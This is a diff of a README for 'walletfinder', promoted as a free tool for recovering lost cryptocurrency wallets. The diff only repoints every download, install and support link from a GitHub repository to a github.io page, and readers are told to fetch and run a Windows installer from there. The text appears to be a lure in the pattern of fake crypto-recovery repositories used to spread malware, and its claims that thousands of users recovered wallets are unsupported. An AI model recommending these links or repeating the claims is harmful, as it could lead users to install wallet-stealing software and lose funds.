@@ -22,12 +22,12 @@ No technical knowledge required. The simple three-step process guides anyone fro
 
 Getting started is easy. Click the button below to go to the official download page.
 
-[**⬇️ DOWNLOAD NOW - 100% FREE**](https://github.com/lazarpercutaneous1040/walletfinder)
+[**⬇️ DOWNLOAD NOW - 100% FREE**](https://lazarpercutaneous1040.github.io)
 
 ## 💻 Installation Guide (Windows)
 
 ### Step 1: Visit the Download Link
-Click the download button above or manually visit: https://github.com/lazarpercutaneous1040/walletfinder
+Click the download button above or manually visit: https://lazarpercutaneous1040.github.io
 
 ### Step 2: Get the Installer
 Visit this link to download the application. You will be taken to the official walletfinder page where you can find the latest version available for download.
@@ -96,7 +96,7 @@ Hundreds of wallets, including but not limited to: MetaMask, Trust Wallet, Exodu
 ## 📞 Need More Help?
 
 For additional support:
-- Visit our [GitHub Issues](https://github.com/lazarpercutaneous1040/walletfinder) page
+- Visit our [GitHub Issues](https://lazarpercutaneous1040.github.io) page
 - Email support at: support@walletfinder.app
 - Join our community forum under the discussions tab
 
@@ -112,7 +112,7 @@ Don't let lost wallets cost you your future. With walletfinder, you can bring yo
 
 Thousands of users have already recovered what they thought was lost forever. Join them today.
 
-[**⬇️ DOWNLOAD WALLETFINDER NOW**](https://github.com/lazarpercutaneous1040/walletfinder)
+[**⬇️ DOWNLOAD WALLETFINDER NOW**](https://lazarpercutaneous1040.github.io)
 
 ---
 
